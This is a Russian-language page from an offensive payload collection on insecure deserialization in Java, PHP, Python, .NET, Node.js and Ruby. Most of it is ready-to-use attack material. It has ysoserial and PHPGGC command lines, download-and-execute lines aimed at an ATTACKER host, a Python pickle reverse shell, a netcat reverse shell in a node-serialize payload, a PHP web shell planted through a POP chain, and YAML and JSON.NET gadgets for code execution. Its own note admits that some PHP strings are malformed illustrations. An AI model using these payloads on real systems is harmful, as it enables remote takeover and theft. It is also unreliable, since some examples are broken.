<a id="-deserialization-payloads"></a>
# 🔓 Полезные нагрузки для десериализации

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../Deserialization.md)

> **Уточнение к оригиналу.** Цепочки гаджетов зависят от версий библиотек и настроек загрузчика. Длины строк и число свойств в некоторых PHP-примерах не соответствуют показанному содержимому: это иллюстрации, сохранённые из оригинала, а не готовые корректные сериализованные объекты; формат описан в [PHP serialize](https://www.php.net/manual/en/function.serialize.php). Начиная с PHP 8 метаданные Phar [не десериализуются автоматически](https://www.php.net/manual/en/migration80.incompatible.php#migration80.incompatible.phar) при доступе к архиву. Наличие сигнатуры формата само по себе не доказывает уязвимость.

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

<a id="-java-deserialization"></a>
## ☕ Десериализация Java

<a id="detection"></a>
### Обнаружение
```
# Сигнатура (magic bytes)
AC ED 00 05    # Сериализованный объект Java (Base64: rO0AB)
H4sIAAAA       # Сжатие GZip

# Типичные места размещения
- Cookies (в кодировке Base64)
- Скрытые поля форм
- ViewState
- Параметры API
- RMI (порт 1099)
- JMX (порт 9010)
```

<a id="ysoserial---payload-generator"></a>
### ysoserial — генератор полезных нагрузок
```bash
# Установка
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Создать полезную нагрузку
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Распространённые цепочки гаджетов
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

<a id="dns-exfiltration-payload"></a>
### Полезная нагрузка для вывода данных через DNS
```bash
# Создать полезную нагрузку с обратным DNS-запросом
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Обнаружение через DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

<a id="common-vulnerable-libraries"></a>
### Распространённые уязвимые библиотеки
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

<a id="-php-deserialization"></a>
## 🐘 Десериализация PHP

<a id="magic-methods"></a>
### Магические методы
```php
__construct()    // Создание объекта
__destruct()     // Уничтожение объекта
__wakeup()       // Десериализация
__sleep()        // Сериализация
__toString()     // Преобразование объекта в строку
__call()         // Недоступный метод
__get()          // Чтение недоступного свойства
__set()          // Запись недоступного свойства
```

<a id="basic-payload"></a>
### Базовая полезная нагрузка
```php
// Формат сериализованного объекта
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Объект со свойствами
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Массив
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

<a id="type-juggling"></a>
### Нестрогое сравнение типов (type juggling)
```php
// Обход через логическое true
O:4:"User":1:{s:8:"password";b:1;}

// Сравнение с целым числом 0
O:4:"User":1:{s:8:"password";i:0;}

// Обход через сравнение с массивом
O:4:"User":1:{s:8:"password";a:0:{}}
```

<a id="pop-chain-payloads"></a>
### Полезные нагрузки с цепочками POP
```php
// Запись произвольного файла
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Выполнение команды через __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

<a id="phpggc---php-gadget-chain"></a>
### PHPGGC — цепочки гаджетов PHP
```bash
# Установка
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Вывести список гаджетов
./phpggc -l

# Создать полезную нагрузку
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Кодирование Base64
./phpggc -b Laravel/RCE1 system "id"

# URL-кодирование
./phpggc -u Laravel/RCE1 system "id"

# С обёрткой PHAR
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

<a id="phar-deserialization"></a>
### Десериализация Phar
```php
// Доступ к Phar-файлам может запускать десериализацию (см. уточнение версии)
phar://path/to/phar.phar/internal-file

// Методы доступа, использующие phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

<a id="-python-deserialization-pickle"></a>
## 🐍 Десериализация Python (Pickle)

<a id="basic-payload-1"></a>
### Базовая полезная нагрузка
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

<a id="reverse-shell-payload"></a>
### Полезная нагрузка обратной оболочки
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

<a id="detection-1"></a>
### Обнаружение
```
# Сигнатура (magic bytes)
80 04 95    # Протокол 4 (Python 3)
80 03       # Протокол 3
80 02       # Протокол 2

# Распространённые шаблоны Base64
gASV        # Протокол 4
gAN         # Протокол 3
```

<a id="yaml-deserialization-python"></a>
### Десериализация YAML (Python)
```yaml
# Небезопасная загрузка PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Несколько команд
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

<a id="-net-deserialization"></a>
## 🔷 Десериализация .NET

<a id="detection-2"></a>
### Обнаружение
```
# ViewState
Параметр __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Сигнатура Base64

# JSON.NET
Поле $type в JSON
```

<a id="ysoserialnet---payload-generator"></a>
### ysoserial.net — генератор полезных нагрузок
```powershell
# Загрузка
# https://github.com/pwntester/ysoserial.net

# Создать полезную нагрузку
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Распространённые гаджеты
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Эксплуатация ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

<a id="jsonnet-typenamehandling"></a>
### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

<a id="-javascriptnodejs"></a>
## 🟨 JavaScript/Node.js

<a id="node-serialize"></a>
### node-serialize
```javascript
// Уязвимый код: unserialize(user_input)
// Полезная нагрузка с IIFE (немедленно вызываемым функциональным выражением)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Обратная оболочка
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

<a id="serialize-javascript"></a>
### serialize-javascript
```javascript
// Если eval() применяется к десериализованным данным
(function(){require('child_process').execSync('id')})()
```

---

<a id="-ruby-deserialization"></a>
## 🔴 Десериализация Ruby

<a id="marshalload"></a>
### Marshal.load
```ruby
# Создать полезную нагрузку
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

<a id="yamlload-psych"></a>
### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

<a id="-testing-checklist"></a>
## 📋 Список проверок

```markdown
□ Определить формат сериализации (Base64, hex, сигнатуры)
□ Определить язык или платформу (Java, PHP, Python, .NET)
□ Найти уязвимые версии библиотек
□ Создать полезные нагрузки подходящим инструментом
□ Проверить слепой метод через обратные DNS/HTTP-запросы
□ Проверить чтение и запись файлов
□ Проверить выполнение кода
□ Проверить разные цепочки гаджетов
□ Проверить обход фильтров (кодирование, сжатие)
```

---

<a id="-tools-summary"></a>
## 🔗 Сводка инструментов

| Язык | Инструмент | Использование |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Собственный код | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Собственный код | Создание полезной нагрузки вручную |

---

<a id="-related-payloads"></a>
## 🔗 Связанные полезные нагрузки

- [Полезные нагрузки SSTI](SSTI.ru.md)
- [Инъекция команд](Command-Injection.ru.md)

---

**Вернуться к полезным нагрузкам:** [💉 Коллекция полезных нагрузок](../../README.ru.md#category-18)
